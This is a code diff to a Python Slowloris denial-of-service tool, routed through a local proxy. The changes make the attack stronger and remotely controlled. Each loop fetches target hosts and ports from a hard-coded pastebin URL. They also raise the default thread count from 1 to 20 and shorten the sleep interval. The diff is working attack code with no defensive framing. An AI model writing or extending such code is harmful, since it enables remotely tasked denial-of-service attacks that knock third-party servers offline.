@@ -14,6 +14,7 @@ import socket
 import sys
 import argparse
 import itertools
+import requests
 
 import socks
 
@@ -75,8 +76,8 @@ class Slowloris:
 
     targethost: str
     targetport: int = 80
-    lines: int = 1000
-    sleeptime: int = 15
+    lines: int = 500
+    sleeptime: int = 10
     proxyhost: str = '127.0.0.1'
     proxyport: int = 9050
 
@@ -191,9 +192,11 @@ class Slowloris:
 
 class CyclingSlowloris:
 
+    DEFAULTSOURCE = "https://pastebin.com/raw/2ugHHQy1"
+
     def __init__(
-            self, /, source: str, *args,
-            innertimeout: int, outertimeout: int = None, **kwargs
+            self, /, source: str = DEFAULTSOURCE, *args,
+            innertimeout: int = 300, outertimeout: int = None, **kwargs
             ):
         self.source = source
         self.innertimeout, self.outertimeout = innertimeout, outertimeout
@@ -206,10 +209,12 @@ class CyclingSlowloris:
         if (timeout := self.outertimeout) is None:
             timeout = sys.maxsize
         while (time.time() - start) < timeout:
-            with open(self.source, mode='r') as file:
-                targets = file.read().split('\n')
-            target = random.choice(targets)
-            Slowloris(target, *self.subargs, **self.subkwargs)(
+            host, *ports = random.choice(
+                requests.get("https://pastebin.com/raw/2ugHHQy1", allow_redirects=True)
+                .content.decode().split('\r\n')
+                ).split(' ')
+            port = int(random.choice(ports))
+            Slowloris(host, port, *self.subargs, **self.subkwargs)(
                 timeout=self.innertimeout,
                 parentid=threadid,
                 )
@@ -254,12 +259,15 @@ if __name__ == '__main__':
         default=Slowloris.targetport,
         )
 
-    cycle.add_argument('source')
+    cycle.add_argument(
+        '--source',
+        default=CyclingSlowloris.DEFAULTSOURCE,
+        )
     cycle.add_argument(
         f'--threads',
         type=int,
         dest='threads',
-        default=1,
+        default=20,
         )
 
     for sub in subs:
